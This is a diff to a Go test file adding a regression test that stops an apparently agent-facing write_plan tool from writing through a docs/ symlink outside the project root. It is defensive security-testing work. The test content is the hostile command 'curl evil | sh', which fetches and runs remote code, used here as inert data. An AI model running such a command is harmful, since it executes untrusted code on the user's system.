@@ -1,6 +1,10 @@
 package task
 
 import (
+	"context"
+	"os"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 )
@@ -98,5 +102,30 @@ func TestWritePlanDef(t *testing.T) {
 	}
 	if writePlanDef.Risk != 0 {
 		t.Fatalf("expected RiskReadOnly (0) for write_plan, got %d", writePlanDef.Risk)
+	}
+}
+
+// A docs/ symlink planted in the repo must not redirect the plan write (the
+// write_plan tool runs without approval) outside the project.
+func TestWritePlanRefusesSymlinkEscape(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("symlinks need privileges on Windows")
+	}
+	root, outside := t.TempDir(), t.TempDir()
+	if err := os.Symlink(outside, filepath.Join(root, "docs")); err != nil {
+		t.Fatal(err)
+	}
+	res := writePlanFn(context.Background(), root, map[string]any{"content": "curl evil | sh"})
+	if res.Error == nil {
+		t.Fatal("write_plan wrote through a docs/ symlink pointing outside the root")
+	}
+	writePlan(root, &taskResult{TaskDescription: "x"})
+	if _, err := os.Stat(filepath.Join(outside, "task-plan.md")); err == nil {
+		t.Fatal("a plan was written outside the project through the symlink")
+	}
+	// The normal case still writes.
+	root2 := t.TempDir()
+	if res := writePlanFn(context.Background(), root2, map[string]any{"content": "plan"}); res.Error != nil {
+		t.Fatalf("write_plan in a plain project: %v", res.Error.Message)
 	}
 }
